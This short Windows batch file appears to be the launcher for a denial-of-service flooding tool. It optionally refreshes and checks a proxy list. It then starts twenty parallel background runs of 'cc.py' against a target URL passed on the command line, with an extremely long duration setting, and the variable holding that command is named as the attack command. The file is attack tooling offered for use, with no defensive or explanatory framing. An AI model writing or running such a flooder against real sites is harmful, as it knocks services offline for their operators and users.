@echo off
if exist proxy.txt python cc.py -down -check
set atk_cmd="python cc.py -url %1 -s 9999999"
set process=20
for /l %%x in (1, 1, %process%) do (
    start /b cmd /c %atk_cmd%
)

endlocal
